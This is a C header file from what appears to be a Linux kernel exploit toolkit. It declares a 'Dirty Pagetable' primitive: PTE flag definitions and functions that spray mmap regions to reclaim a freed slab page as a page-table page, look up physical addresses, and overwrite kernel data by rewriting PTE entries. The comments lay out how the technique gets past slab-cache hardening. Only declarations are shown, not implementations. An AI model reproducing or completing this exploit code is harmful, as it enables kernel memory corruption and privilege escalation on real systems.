#ifndef ANGBAND_DIRTY_PAGETABLE_H
#define ANGBAND_DIRTY_PAGETABLE_H

#include "common.h"
#include <sys/mman.h>

/*
 * Dirty Pagetable -- page-level exploitation primitive.
 *
 * When CONFIG_RANDOM_KMALLOC_CACHES blocks same-cache slab grooming,
 * we drain the target slab page back to the buddy allocator, then
 * reclaim it as a PTE page via mmap() spray.
 *
 * Once the freed object's page is under our control as a PTE page,
 * we can read/write the target kernel data at known offsets.
 */

/* PTE entry flags */
#define PTE_PRESENT  (1UL << 0)
#define PTE_RW       (1UL << 1)
#define PTE_USER     (1UL << 2)
#define PTE_ACCESSED (1UL << 5)
#define PTE_DIRTY    (1UL << 6)

/* Number of mmap regions to spray for PTE page reclamation */
#define PTE_SPRAY_PAGES 1024
#define PTE_PAGE_SIZE   4096

/**
 * pte_spray_init - Allocate virtual memory regions to force PTE allocation.
 * Stores allocated addresses in the global `pte_addrs[]` array.
 * Returns the number of regions successfully mapped.
 */
int pte_spray_init(void);

/**
 * pte_spray_cleanup - Unmap all PTE spray regions.
 */
void pte_spray_cleanup(void);

/**
 * pte_lookup_phys - Find the physical address of a virtual page.
 * @vaddr: Virtual address (page-aligned)
 * Returns the physical page frame number, or 0 on error.
 */
unsigned long pte_lookup_phys(void *vaddr);

/**
 * pte_overwrite - Overwrite data at the freed slot through PTE manipulation.
 *
 * @target_phys: Physical address of the slab page containing the freed object
 * @data:        Data to write
 * @len:         Length of data
 * @offset:      Offset within the slab page to write to
 *
 * This works by: we scan our PTE spray regions, find one whose physical
 * page matches `target_phys`, then modify the PTE entry to grant us
 * write access, then memcpy.
 */
int pte_overwrite(unsigned long target_phys, const void *data,
                  size_t len, unsigned long offset);

void *pte_get_addr(int idx);
int pte_get_count(void);
unsigned long pte_get_page_phys(int idx);

#endif
